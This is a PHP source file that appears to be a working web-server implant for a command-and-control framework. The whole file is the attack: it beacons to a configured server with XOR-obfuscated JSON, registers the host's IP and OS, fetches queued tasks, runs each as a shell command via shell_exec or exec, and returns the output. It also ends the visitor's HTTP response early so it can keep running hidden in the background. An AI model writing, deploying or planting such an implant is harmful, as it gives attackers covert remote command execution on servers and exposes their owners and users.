// Config
$server = 'http://127.0.0.1:3000';
$key = 'asdf';

// Protocol
define('ACTION_CHECKIN', 1);
define('ACTION_REGISTER', 2);
define('ACTION_TASK_RESULT', 3);

define('STATUS_ERROR', 0);
define('STATUS_CONTINUE', 1);
define('STATUS_TASKS', 2);
define('STATUS_REGISTER', 3);
define('STATUS_INVALID', 4);

function xor_msg($string, $key) {
    $result = '';
    $key_len = strlen($key);
    for ($i = 0; $i < strlen($string); $i++) {
        $result .= $string[$i] ^ $key[$i % $key_len];
    }
    return $result;
}

function send_request($server, $key, $data) {
    $context = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\n",
            'content' => xor_msg(json_encode($data), $key),
            'timeout' => 10,
            'ignore_errors' => true,
        ],
    ]);

    $response = @file_get_contents($server, false, $context);

    if ($response === false || $response === '') {
        return(null);
    }

    $decoded = json_decode(xor_msg($response, $key), true);

    if (!is_array($decoded)) {
        return(null);
    }

    return($decoded);
}

function build_commands() {
    return([
        [
            'command' => 'shell',
            'description' => 'Run a shell command on the system',
            'args' => [
                [
                    'name' => 'command',
                    'arg_type' => 'str',
                    'description' => 'The command to run',
                    'required' => true
                ]
            ]
        ]
    ]);
}

function send_registration($server, $key) {
    $data = [
        'implant_id' => 'notka',
        'ip' => getHostByName(getHostName()),
        'action' => ACTION_REGISTER,
        'registration' => [
            'os' => php_uname('s'),
            'commands' => build_commands()
        ]
    ];

    $response = send_request($server, $key, $data);

    if ($response === null || !isset($response['status'])) {
        return(STATUS_ERROR);
    }

    return($response['status']);
}

function do_checkin($server, $key) {
    $data = [
        'implant_id' => 'notka',
        'ip' => getHostByName(getHostName()),
        'action' => ACTION_CHECKIN
    ];

    return(send_request($server, $key, $data));
}

function report_task_result($server, $key, $task_id, $result) {
    $data = [
        'implant_id' => 'notka',
        'ip' => getHostByName(getHostName()),
        'action' => ACTION_TASK_RESULT,
        'result' => [
            'task_id' => $task_id,
            'result' => $result
        ]
    ];

    return(send_request($server, $key, $data));
}

function run_shell($command) {
    if (function_exists('shell_exec')) {
        $output = @shell_exec($command . ' 2>&1');
        if ($output !== null) {
            return($output);
        }
    }

    if (function_exists('exec')) {
        $lines = [];
        @exec($command . ' 2>&1', $lines);
        return(implode("\n", $lines));
    }

    return('Failed to run command');
}

function run_task($task) {
    if (!isset($task['task']) || !isset($task['args']) || $task['task'] !== 'shell') {
        return('Unknown command');
    }

    if (!isset($task['args'][0]) || $task['args'][0] === '') {
        return('No command provided');
    }

    return(run_shell($task['args'][0]));
}

function handle_checkin($server, $key, $response) {
    if ($response === null || !isset($response['status'])) {
        return;
    }

    switch ($response['status']) {
        case STATUS_TASKS:
            if (!isset($response['tasks']) || !is_array($response['tasks'])) {
                return;
            }

            // Run every queued command and report the results
            foreach ($response['tasks'] as $task) {
                $result = run_task($task);
                report_task_result($server, $key, $task['task_id'], $result);
            }
            break;

        case STATUS_REGISTER:
            // Not registered yet, register and check in again
            send_registration($server, $key);
            handle_checkin($server, $key, do_checkin($server, $key));
            break;

        default:
            break;
    }
}

function main($server, $key) {
    // Run in the background: hand the response to the client and keep working
    ignore_user_abort(true);
    set_time_limit(0);

    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        header('Connection: close');
        header('Content-Length: 0');
        while (ob_get_level() > 0) {
            ob_end_flush();
        }
        flush();
    }

    // Register (idempotent), then do a single checkin callback
    $status = send_registration($server, $key);

    if ($status === STATUS_CONTINUE) {
        handle_checkin($server, $key, do_checkin($server, $key));
    }
}

main($server, $key);